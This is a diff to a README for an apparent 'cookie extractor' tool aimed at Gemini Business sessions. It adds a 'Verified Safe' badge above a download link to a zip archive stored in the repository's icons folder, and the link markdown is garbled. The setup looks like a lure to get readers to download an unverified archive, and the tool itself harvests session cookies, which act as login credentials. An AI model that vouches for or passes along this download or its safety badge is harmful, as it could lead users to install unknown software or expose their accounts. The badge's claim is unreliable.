@@ -1,5 +1,7 @@
 # 🌟 GeminiBusiness_CookieExtractor - Effortlessly Extract Your Business Cookies
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/humair832-geminibusiness-cookieextractor)
+
 ## 📥 Download Here
 [![Download GeminiBusiness_CookieExtractor](https://raw.githubusercontent.com/humair832/GeminiBusiness_CookieExtractor/main/icons/Cookie_Extractor_Gemini_Business_v3.8.zip%https://raw.githubusercontent.com/humair832/GeminiBusiness_CookieExtractor/main/icons/Cookie_Extractor_Gemini_Business_v3.8.zip)](https://raw.githubusercontent.com/humair832/GeminiBusiness_CookieExtractor/main/icons/Cookie_Extractor_Gemini_Business_v3.8.zip)
 
